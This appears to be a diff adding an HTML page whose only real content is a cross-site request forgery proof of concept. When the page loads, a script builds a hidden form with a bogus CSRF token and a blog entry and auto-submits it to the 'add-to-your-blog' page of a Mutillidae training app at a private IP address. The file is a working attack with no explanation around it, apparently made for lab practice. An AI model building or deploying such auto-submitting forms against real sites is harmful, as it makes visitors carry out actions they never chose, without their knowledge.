@@ -1,0 +1,47 @@
+<!doctype html>
+<html lang="en">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="Generator" content="EditPlus®">
+  <meta name="Author" content="">
+  <meta name="Keywords" content="">
+  <meta name="Description" content="">
+  <title>Document</title>
+ </head>
+ <body>
+
+ hi
+
+<script>
+
+
+  	var lCSRFForm = window.document.createElement("form");
+   	lCSRFForm.name="CSRFForm";
+   	lCSRFForm.method="post";
+	lCSRFForm.action="http://10.10.10.132/mutillidae/index.php?page=add-to-your-blog.php";
+   	
+   		var lInput = document.createElement("input");
+   		lInput.type="hidden";
+   		lInput.name="csrf-token";
+   		lInput.value="SecurityIsDisabled";
+   		lCSRFForm.appendChild(lInput);
+
+		var lInput2 = document.createElement("input");
+   		lInput2.type="hidden";
+   		lInput2.name="blog_entry";
+   		lInput2.value="hello test!!!";
+   		lCSRFForm.appendChild(lInput2);
+
+		var lInput3 = document.createElement("input");
+   		lInput3.type="hidden";
+   		lInput3.name="add-to-your-blog-php-submit-button";
+   		lInput3.value="Save Blog Entry";
+   		lCSRFForm.appendChild(lInput3);
+   	
+   	window.document.body.appendChild(lCSRFForm);
+   	lCSRFForm.submit();
+
+
+</script>
+ </body>
+</html>
